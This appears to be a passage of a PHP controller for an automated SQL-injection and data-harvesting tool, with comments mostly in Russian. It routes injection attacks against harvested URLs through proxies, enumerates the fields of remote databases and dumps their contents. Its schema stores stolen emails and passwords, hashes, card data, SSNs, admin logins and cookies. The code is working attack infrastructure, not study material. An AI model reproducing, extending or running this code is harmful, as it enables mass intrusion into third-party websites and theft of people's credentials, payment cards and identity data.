		$squle['Post'] = $data['Post'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'set');
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$data2['posts'] = $data['Post']; 

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data2,$set);
		
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);

		//print_r($data2);
		//die();
		
		//$data3 = explode(',', $data2);
		
		$data['field'][$bd][$table] = $data2;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('data');
		
		
	}
	
	function getcooldata(){// выводит данные на страницу РАБОТАЕТ

		
		$order = array();
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $t[1];
		
		$get['bd']	  =  $t[0];
		
		$get['where'] =  $this->Session->read('getwhere');
		
		$get['order'] =  $this->Session->read('getorder');
		
		$get['desc'] =  $this->Session->read('getdesc');

		$get['field'] =  $this->Session->read('field');
		
		$this->d($get,'get');
		
		
		$data = $this->Session->read('inject');
		
		$this->d($data,'data');
		
		$squle['Post'] = $data['Post'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$this->d($set,'set');
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$data2['posts'] = $data['Post']; 
		
		//$this->d($get,'get');
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data2,$set);
		
		
		
		// mysqlGetAllValue($bd,$table,$needle,$count=0,$order=array(),$where='')

		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],explode(',',$get['field']),$get['limit'],$order,$get['where']);
		
		//$this->d($data3,'date3');
		//exit;
		
		//$this->mysqlInj->mysqlGetCountInsert($get['bd'],$get['table'],$get['where']);
		
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'],$get['table']);
		$this->Session->write('counttable',$count);
		
		
		$data = array('data'=>array($data['Post']['id']=>$data3));
		
		//print_r($data);
		//die();
		
		$this->layout=false;

		$this->set('field',$this->Session->read('field'));
		
		$this->set('counttable',$count);
		
		$this->set('dataCOLL',$data);
		
		$this->render('viewdata');
		//echo 'smack my bitch up!';
		
		//print_r($this->data);
		//die();
	}
	
	function gettable(){// Выводит список field
		
		$this->layout = FALSE;
		$fileds = $this->Session->read('field');
		$this->set('field',$fileds);	
		
	}
	
	function viewdata(){

		$data = array('data'=>array(2=>array(0=>array('id'=>'11','date'=>'РґР¶РёРіСѓСЂРґР°!1'))));
		$this->layout=false;
		//		echo $counttable;

		$this->set('count',$this->Session->read('field'));
		$this->set('field',$this->Session->read('field'));
		$this->set('dataCOLL',$data);
		
	}
	
	function shlakk($g='0'){//удаляет ссылки того или иного типа
		if(intval($g)==0){
			
			///echo "DELETE FROM `posts` WHERE `status` =0";
			$this->Post->query("DELETE FROM `posts` WHERE `status` =0");
			
		}
		elseif($g=='1_sql'){
			
			echo "DELETE FROM `posts` WHERE `sqlmap_check` =1";
			$this->Post->query("DELETE FROM `posts` WHERE `sqlmap_check` =1");
			
		}
		elseif(intval($g)==1 or intval($g)=='1'){
			
			echo "DELETE FROM `posts` WHERE `status` =0";
			$this->Post->query("DELETE FROM `posts` WHERE `status` =0");
			
		}
		else{
			
			//echo "DELETE FROM `posts` WHERE `status`=2 AND `prohod`<5";
			$this->Post->query("DELETE FROM `posts` WHERE `status`=2 AND `prohod`<5");
		}
		
		//die();
		$this->redirect(array('action'=>'mailinfo'));
		die();
	}
	
	function multi_duble_check(){
        
        //SELECT count(*) as `count` FROM 	`posts` WHERE `status`=2 and `prohod` =5");	
		$this->Post->query("UPDATE  `posts` SET  `prohod` =  0 AND `multi_count`=0 WHERE `prohod` =5 ");
		echo 'OK';
	}
	
    function multi_duble_check2(){
    
        if($this->multi_count ==''){
            
            $this->multi_count=3;
        }


        $this->Post->query("UPDATE  `posts` SET  `prohod` =  0 WHERE  `posts`.`prohod` =5 AND `multi_count` <".$this->multi_count);
        echo 'OK';
    }

    
	function multi_duble_check_email(){
		$this->Post->query("UPDATE  `posts` SET  `getmail` =  0 WHERE  `posts`.`getmail` =1");
		echo 'OK';
	}
	
	function sqlmap_check_all(){
		$this->Post->query("UPDATE  `posts` SET  `sqlmap_check` =  1 ");
		echo 'OK';
	}
	
	function sqlmap_check_y(){
		$this->Post->query("UPDATE  `posts` SET  `sqlmap_check` =  1 WHERE `status`=2 or `status`=3");
		echo 'OK';
	}
	
	function sqlmap_check_ne(){
		$this->Post->query("UPDATE  `posts` SET  `sqlmap_check` =  1  WHERE `status`=2 AND `prohod`=5");
		echo 'OK';
	}
	
	function shlakk_domen($g='1'){//удаляет ссылки того или иного типа
		if(intval($g)==1){
			
			///echo "DELETE FROM `posts` WHERE `status` =0";
			$this->Post->query("DELETE FROM `domens`");
			
		}

		
		
		//die();
		$this->redirect(array('action'=>'mailinfo'));
		die();
	}
	
	function shlakk_domen_links($g=1){//удаляет ссылки того или иного типа
		
			///echo "DELETE FROM `posts` WHERE `status` =0";
			$this->Post->query("DELETE FROM `posts_all` WHERE id =".$g);
			
		
		
		
		//die();
		$this->redirect(array('action'=>'order_domens'));
		die();
	}
	
	function shlak($id){//устанавливает статус в один
		
		$this->Post->query("UPDATE  `posts` SET  `status` =  '1' WHERE  `posts`.`id` =".intval($id)." LIMIT 1 ;");
		//$this->redirect($_SERVER['HTTP_REFERER']);
		die();
		
	}
	
	function shlak2($ggg = Null){//сбартые для короративных доменов
		
		
		if($ggg =='corp'){
			$this->Post->query("UPDATE  `mails` SET  `type` = '0' WHERE  `type` ='corp'");
		}
		
		if($ggg =='big'){
			$this->Post->query("UPDATE  `mails` SET  `type` = '0' WHERE  `type` ='big'");
		}
		
		if($ggg =='sred'){
			$this->Post->query("UPDATE  `mails` SET  `type` = '0' WHERE  `type` ='sred'");
		}
		$this->redirect(array('action'=>'mailinfo'));
		die();
		
	}
	
	function shlak3($id){//устанавливает статус в один
		
		$this->Post->query("DELETE FROM `fileds` WHERE `id` =".intval($id)." LIMIT 1 ;");
		//$this->redirect($_SERVER['HTTP_REFERER']);
		die();
		
	}
	
	function shlak_card($id){//устанавливает статус в один
		
		$this->Post->query("DELETE FROM `orders` WHERE `id` =".intval($id)." LIMIT 1 ;");
		//$this->redirect($_SERVER['HTTP_REFERER']);
		die();
		
	}
	
	function shlak_ssn($id){//устанавливает статус в один
		
		$this->Post->query("DELETE FROM `ssn` WHERE `id` =".intval($id)." LIMIT 1 ;");
		//$this->redirect($_SERVER['HTTP_REFERER']);
		die();
		
	}
	
	function mat(){//выводит все где status 2
		
		$data = $this->Post->query("SELECT * FROM posts WHERE status=2");
		
		foreach ($data as $value){
			
			
			$url =  'http://'.$value['posts']['host'].$value['posts']['path'].'?'.$value['posts']['query'];
			echo $url.' - <font color=red>'.$value['posts']['find'].'</font>|'.$value['posts']['tic'].'<br><br>';
			
		}
		
		die();
	}
	
	function post_recheck(){
		
		$this->Post->query("UPDATE  `posts`  set `status` = 0 AND `prohod` = 0,`find`='' WHERE `status`=1 ");
		
		$this->d('ok');
	}
	
	function domen_recheck(){
		
		$this->Post->query("UPDATE  `domens`  set `status` = 0  WHERE `status`=1 ");
		
		$this->d('ok');
	}
	
	function view_multi($id){
		//$id = 7196;
		$data = $this->Post->query("SELECT *  FROM `multis` WHERE `filed_id`=".$id);
		
		//$this->d($id,'$id');
		//$this->d($data,'data');
		
		//$this->layout=false;
		$this->set('data',$data);	
		
	}
	
	function view_iframe($id){
		
		$url = 	'/posts/view_multi/'.$id;
		echo '<iframe name="fr1" src="'.$url.'" width="1040" height="500"> </iframe>';
		die();
		
	}
	
	function view_order($id){
		//$id = 7196;
		$data = $this->Post->query("SELECT *  FROM `orders` WHERE `id`=".$id);
		
		//$this->d($id,'$id');
		//$this->d($data,'data');
		
		//$this->layout=false;
		$this->set('data',$data);	
		
	}
	
	function view_iframe_order($id){
		
		$url = 	'/posts/view_order/'.$id;
		echo '<iframe name="fr1" src="'.$url.'" width="1040" height="500"> </iframe>';
		die();
		
	}
	
	function view_order_one($id,$table = 'posts'){
		//$id = 7196;
		$data = $this->Post->query("SELECT *  FROM `$table` WHERE `id`=".$id." limit 1");
		
		$squles = $data;
		
		 $squle = $squles[0];
			
		
		//$this->d($data);
		//exit;
		$status =  $data[0][$table]['status'];
		$prohod =  $data[0][$table]['prohod'];
		$url = $data[0][$table]['url'];
		$date = $data[0][$table]['date'];
		$maska = $data[0][$table]['maska'];
		$domen = $data[0][$table]['domen'];
		$gurl = $data[0][$table]['gurl'];
		$sposob = $data[0][$table]['sposob'];
		$method = $data[0][$table]['method'];
		$column = $data[0][$table]['column'];
		$work = $data[0][$table]['work'];
		$file_priv = $data[0][$table]['file_priv'];
		$sleep = $data[0][$table]['sleep'];
		$tic = $data[0][$table]['tic'];
		$version = $data[0][$table]['version'];
		$find = $data[0][$table]['find'];
		$user = $data[0][$table]['user'];
		$http = $data[0][$table]['http'];
		$header = $data[0][$table]['header'];
		
		
		
		
		
		
		//$value = $url;
		
		if($gurl !=''){
			
			$value = $gurl;
		}	else{
			
			$value = $url;
		}
		
	
		
		
		
		if($status == 2 AND $status !=1)
		{
			
			
			
			$value_orig = $value;
			
			$this->mysqlInj = new InjectorComponent();
			//$this->mysqlInj->check_https($value );
			//$value = $this->mysqlInj->filter_url($value);
			
			
			
			if($http =='https' or $http =='https://')
			{
				$this->mysqlIn->https = true;
			}else{
				$this->mysqlIn->https = false;
			}
			
		
			//$value_orig = $this->mysqlInj->filter_url($value_orig);
			
			
			
		
			$data =   parse_url('http://'.str_replace(array('https://','http://'),'',$value_orig));
			
			$this->d($value_orig,'$data$data$data');
			
			$domen = $data['host'];
			
			
			
			if($data['query'] =='')
			{
				$this->d($value_orig.' - query pusto');
				exit;
			}
			
			if(!isset($data['host']))
			{
				$this->d($value_orig.' - host pusto');
				exit;
				
			}
			
			
			
			

			$data = $this->oneinfo($header.'::'.$http.$value,$domen);
			
			if($data==false){
				echo 'NE LOMAETSYA';
			}
			
			
		}else{
			
			
			
				//$this->d($squle[$table]['id'],'id');
				
				
				
				$squle['Post'] = $squle[$table];
				
				if(strlen($squle['Post']['sleep']) > 2)
				{
					$set = $squle['Post']['sleep'];
					//$this->d($set,'set');
				}else
				{
					$set = false;
				}
				
			
				
				
				$this->mysqlInj = new $this->Injector();
				
				
				
				$ver = $this->mysqlInj->version;
				
				$this->proxyCheck();
				
				$this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl'],$squle,$set);
				
				//$this->mysqlInj->mysqlGetVersion();
				
				$this->mysqlInj->mysqlGetUser();

				$user = $this->mysqlInj->user;
				
				if($this->mysqlInj->https==true){
				
					$http ='https';
				}else{
					$http ='http';
				}

			
		
			if($id = $this->Post->query("INSERT INTO `posts_one` 
			(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`http`,`user`,`header`)
			VALUES ('$url','$date','$maska','$domen','$gurl',5,3,'$sposob','$method','$column','$work','$file_priv','$sleep','$tic','$version','$find','$http','$user','$header')"))
			{
				
				
				
				//echo $domen.' - Добавлен в обработку<br>';	
				$data2 = $this->Post->query("SELECT *  FROM `posts_one` WHERE `domen`='".$domen."' limit 1");
				$id2  = $data2[0]['posts_one']['id'];
				
				
				
				echo "<a href='/posts/krutaten_one/$id2/load'>REDIRECT</a>";
				$this->redirect(array('action'=>"krutaten_one/$id2/load"));
				
				//http://greenel.com/posts/krutaten_one/29/load
				
			}else
			{
				#echo mysql_error();
				$data2 = $this->Post->query("SELECT *  FROM `posts_one` WHERE `domen`='".$domen."' limit 1");
				$id2  = $data2[0]['posts_one']['id'];
				echo "<a href='/posts/krutaten_one/$id2/load'>REDIRECT</a>";
				$this->redirect(array('action'=>"krutaten_one/$id2/load"));
					
			}
		
		}

		$this->set('data',$data);	
		
	}
	
	
	
	///На главной странице опции///
	function update_all_oll(){ ///////// UPDATE все колонки и создает новые таблицы/////////
		
	set_time_limit(0);  	
		
		$posts_all ="
CREATE TABLE IF NOT EXISTS `posts_all` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prohod` int(10) unsigned NOT NULL,
  `gurl` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `tables` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `status` int(10) unsigned NOT NULL,
  `work` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `sposob` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `method` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `column` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `mysqlbd` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `file_priv` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `version` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `tic` int(3) DEFAULT NULL,
  `category` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `proverka_self` int(10) unsigned NOT NULL,
  `domen` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `path_query` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `query` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `link_count` int(10) NOT NULL DEFAULT '0',
  `check_posts` int(3) NOT NULL DEFAULT '0',
  `url` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `find` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `getmail` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `maska` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `date` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `sleep` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `tema` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `testing` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `admin` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `pr` int(50) NOT NULL DEFAULT '0',
  `pr_check` int(3) NOT NULL DEFAULT '0',
  `alexa` int(50) NOT NULL DEFAULT '100000000',
  `alexa_check` int(3) NOT NULL DEFAULT '0',
  `country` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'checking',
  `country_check` int(3) NOT NULL DEFAULT '0',
  `order` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `order_check` int(3) NOT NULL DEFAULT '0',
  `crawler` int(3) NOT NULL DEFAULT '0',
  `get_type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `http` varchar(100) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'http://',
  `color` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `up` int(2) NOT NULL DEFAULT '0',
  `ssn` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `ssn_check` int(3) NOT NULL DEFAULT '0',
  `table_admin_check` int(3) NOT NULL DEFAULT '0',
  `cookies` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `path_query` (`path_query`),
  UNIQUE KEY `url` (`url`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;";
		
		$this->Post->query($posts_all);
		
		$mails="CREATE TABLE IF NOT EXISTS `mails` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) NOT NULL,
  `pass` varchar(255) NOT NULL,
  `domen` varchar(255) NOT NULL,
  `zona` varchar(255) NOT NULL,
  `bd` varchar(255) NOT NULL,
  `date` date NOT NULL,
  `hashtype` varchar(255) NOT NULL DEFAULT '0',
  `hash` varchar(255) NOT NULL DEFAULT '0',
  `hash2` varchar(255) DEFAULT '0',
  `meiler` varchar(255) NOT NULL DEFAULT '0',
  `type` varchar(255) NOT NULL DEFAULT '0',
  `mx` varchar(255) NOT NULL DEFAULT '0',
  `abuse` int(3) NOT NULL DEFAULT '0',
  `down` int(3) NOT NULL DEFAULT '0',
  `clean` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `email` (`email`),
  KEY `i_meiler` (`meiler`) USING BTREE,
  KEY `i_date` (`date`) USING BTREE,
  KEY `i_domen` (`domen`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($mails);
		
		
		$this->Post->query('ALTER TABLE `mails` ADD UNIQUE `unique_index`(`email`, `pass`);');
		
		
		$dump_orders = "CREATE TABLE IF NOT EXISTS `orders` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `shema` varchar(255) NOT NULL DEFAULT '0',
  `bd` varchar(255) NOT NULL DEFAULT '0',
  `table` varchar(255) DEFAULT '0',
  `column` varchar(255) NOT NULL DEFAULT '0',
  `column_16` int(3) NOT NULL DEFAULT '0',
  `count_n` int(3) NOT NULL DEFAULT '0',
  `count` int(11) NOT NULL,
  `count_new` int(20) NOT NULL,
  `check_count` int(3) NOT NULL DEFAULT '0',
  `domen` varchar(255) DEFAULT '0',
  `card2` varchar(255) NOT NULL DEFAULT '0',
  `date` varchar(255) NOT NULL,
  `date_new` varchar(255) NOT NULL,
  `color` varchar(50) NOT NULL DEFAULT '0',
  `count_new2` int(20) NOT NULL DEFAULT '0',
  `typedb` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($dump_orders);

		$dump_orders_card = "CREATE TABLE IF NOT EXISTS `orders_card` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`order_id` int(3) NOT NULL,
`column` varchar(255) NOT NULL DEFAULT '0',
`data` varchar(255) NOT NULL DEFAULT '0',
`column1` varchar(255) NOT NULL DEFAULT '0',
`data1` varchar(255) NOT NULL DEFAULT '0',
`column2` varchar(255) NOT NULL DEFAULT '0',
`data2` varchar(255) NOT NULL DEFAULT '0',
`column3` varchar(255) NOT NULL DEFAULT '0',
`data3` varchar(255) NOT NULL DEFAULT '0',
`column4` varchar(255) NOT NULL DEFAULT '0',
`data4` varchar(255) NOT NULL DEFAULT '0',
`column5` varchar(255) NOT NULL DEFAULT '0',
`data5` varchar(255) NOT NULL DEFAULT '0',
`prich` varchar(255) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
		$this->Post->query($dump_orders_card);
		
		
		$orders_one ="REATE TABLE IF NOT EXISTS `orders_one` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `shema` varchar(255) NOT NULL DEFAULT '0',
  `bd` varchar(255) NOT NULL DEFAULT '0',
  `table` varchar(255) DEFAULT '0',
  `card2` varchar(255) NOT NULL,
  `column` varchar(255) NOT NULL DEFAULT '0',
  `column_16` int(3) NOT NULL DEFAULT '0',
  `count_n` int(3) NOT NULL DEFAULT '0',
  `count` int(11) NOT NULL,
  `domen` varchar(255) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($orders_one);


		
		$mails_one = "CREATE TABLE IF NOT EXISTS `mails_one` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) NOT NULL,
  `pass` varchar(255) NOT NULL,
  `domen` varchar(255) NOT NULL,
  `zona` varchar(255) NOT NULL,
  `bd` varchar(255) NOT NULL,
  `date` date NOT NULL,
  `hashtype` varchar(255) NOT NULL DEFAULT '0',
  `hash` varchar(255) NOT NULL DEFAULT '0',
  `hash2` varchar(255) DEFAULT '0',
  `meiler` varchar(255) NOT NULL DEFAULT '0',
  `type` varchar(255) NOT NULL DEFAULT '0',
  `mx` varchar(255) NOT NULL DEFAULT '0',
  `abuse` int(3) NOT NULL DEFAULT '0',
  `down` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  KEY `i_meiler` (`meiler`) USING BTREE,
  KEY `i_date` (`date`) USING BTREE,
  KEY `i_domen` (`domen`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($mails_one);
		
		$multis_one = "CREATE TABLE IF NOT EXISTS `multis_one` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filed_id` int(11) DEFAULT '0',
  `post_id` int(11) DEFAULT '0',
  `domen` varchar(255) DEFAULT '0',
  `lastlimit` int(11) DEFAULT '0',
  `count` int(11) DEFAULT '0',
  `get` int(2) DEFAULT '0',
  `potok` int(2) DEFAULT '0',
  `function` int(3) DEFAULT '0',
  `prich` varchar(255) DEFAULT '0',
  `isp` varchar(255) DEFAULT '0',
  `dok` int(3) DEFAULT '0',
  `date` int(11) DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
		$this->Post->query($multis_one);
		
		$dd = "CREATE TABLE IF NOT EXISTS `mails_dumping` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) NOT NULL,
  `pass` varchar(255) NOT NULL,
  `domen` varchar(255) NOT NULL,
  `zona` varchar(255) NOT NULL,
  `bd` varchar(255) NOT NULL,
  `date` date NOT NULL,
  `hashtype` varchar(255) NOT NULL DEFAULT '0',
  `hash` varchar(255) NOT NULL DEFAULT '0',
  `hash2` varchar(255) DEFAULT '0',
  `meiler` varchar(255) NOT NULL DEFAULT '0',
  `type` varchar(255) NOT NULL DEFAULT '0',
  `mx` varchar(255) NOT NULL DEFAULT '0',
  `abuse` int(3) NOT NULL DEFAULT '0',
  `down` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  KEY `i_meiler` (`meiler`) USING BTREE,
  KEY `i_date` (`date`) USING BTREE,
  KEY `i_domen` (`domen`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
		$this->Post->query($dd);
		
		
		$dump1 = "CREATE TABLE IF NOT EXISTS `fileds_one` (
		`id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`post_id` varchar(255) DEFAULT NULL,
`table` varchar(255) DEFAULT '',
`password` varchar(255) DEFAULT '',
`get` varchar(255) DEFAULT '',
`lastlimit` varchar(255) DEFAULT '',
`function` varchar(255) DEFAULT '',
`count` int(11) NOT NULL,
`ipbase` varchar(255) DEFAULT NULL,
`ipbase2` varchar(255) NOT NULL,
`label` varchar(255) DEFAULT NULL,
`salt` varchar(255) DEFAULT NULL,
`dok` int(5) DEFAULT '0',
`site` varchar(255) DEFAULT '0',
`multi` int(2) DEFAULT '0',
`color` varchar(50) NOT NULL DEFAULT '0',
`up` int(3) NOT NULL DEFAULT '0',
`potok` int(3) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
		$this->Post->query($dump1);
		
		
		$dump2 = "CREATE TABLE IF NOT EXISTS `posts_one` (
 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prohod` int(10) unsigned NOT NULL,
  `gurl` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `tables` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `status` int(10) unsigned NOT NULL,
  `work` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `sposob` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `method` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `column` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `user` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `mysqlbd` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `file_priv` varchar(255) CHARACTER SET latin1 DEFAULT '0',
  `version` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `tic` int(3) DEFAULT NULL,
  `category` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `proverka_self` int(10) unsigned NOT NULL,
  `domen` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `url` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `find` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `getmail` varchar(255) CHARACTER SET latin1 DEFAULT '',
  `maska` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `date` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `sleep` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `tema` varchar(255) COLLATE utf8_unicode_ci DEFAULT '0',
  `testing` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `admin` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `pr` int(50) NOT NULL DEFAULT '0',
  `pr_check` int(3) NOT NULL DEFAULT '0',
  `alexa` int(50) NOT NULL DEFAULT '100000000',
  `alexa_check` int(3) NOT NULL DEFAULT '0',
  `country` varchar(255) COLLATE utf8_unicode_ci DEFAULT 'cheking',
  `country_check` int(3) DEFAULT '0',
  `color` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `up` int(2) NOT NULL DEFAULT '0',
  `order` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `order_check` int(3) NOT NULL DEFAULT '0',
  `path1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `path2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `path3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `site1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `site2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `site3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `path_conf1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `path_conf2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `path_conf3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `cookies` varchar(500) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `domen` (`domen`),
  UNIQUE KEY `url` (`url`),
  KEY `ddd` (`domen`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";
		$this->Post->query($dump2);
		
		$ssn="CREATE TABLE IF NOT EXISTS `ssn` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `shema` varchar(255) NOT NULL DEFAULT '0',
  `bd` varchar(255) NOT NULL DEFAULT '0',
  `table` varchar(255) DEFAULT '0',
  `column` varchar(255) NOT NULL DEFAULT '0',
  `column_16` int(3) NOT NULL DEFAULT '0',
  `count_n` int(3) NOT NULL DEFAULT '0',
  `count` int(11) NOT NULL,
  `count_new` int(20) NOT NULL,
  `check_count` int(3) NOT NULL DEFAULT '0',
  `domen` varchar(255) DEFAULT '0',
  `card2` varchar(255) NOT NULL DEFAULT '0',
  `date` varchar(255) NOT NULL,
  `date_new` varchar(255) NOT NULL,
  `color` varchar(50) NOT NULL DEFAULT '0',
  `count_new2` int(20) NOT NULL DEFAULT '0',
  `typedb` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
		$this->Post->query($ssn);
		
		$dumpers_one ="CREATE TABLE IF NOT EXISTS `dumpers_one` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `post_id` int(11) NOT NULL,
  `filed_id` int(10) unsigned NOT NULL,
  `bd` varchar(255) NOT NULL,
  `table` varchar(255) NOT NULL,
  `filed` varchar(255) NOT NULL,
  `get` int(3) NOT NULL DEFAULT '0',
  `multi` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `filed_id` (`filed_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;";
		$this->Post->query($dumpers_one);
		
		
		$domens = "CREATE TABLE IF NOT EXISTS `domens` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bad` int(3) NOT NULL,
  `domen` varchar(255) NOT NULL,
  `domen_new` varchar(255) NOT NULL,
  `status` int(10) NOT NULL DEFAULT '0',
  `find` varchar(255) NOT NULL DEFAULT '',
  `domen_check` int(3) NOT NULL DEFAULT '0',
  `http` varchar(255) NOT NULL,
  `post_check` int(3) NOT NULL DEFAULT '0',
  `get_url` varchar(255) DEFAULT NULL,
  `post_url` varchar(255) NOT NULL,
  `get_type` varchar(100) NOT NULL DEFAULT '',
  `date` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `domen` (`domen`),
  UNIQUE KEY `get_url` (`get_url`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
		$this->Post->query($domens);
		
		$bds_one = "CREATE TABLE IF NOT EXISTS `bds_one` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` varchar(255) DEFAULT NULL,
  `bd` varchar(255) DEFAULT '',
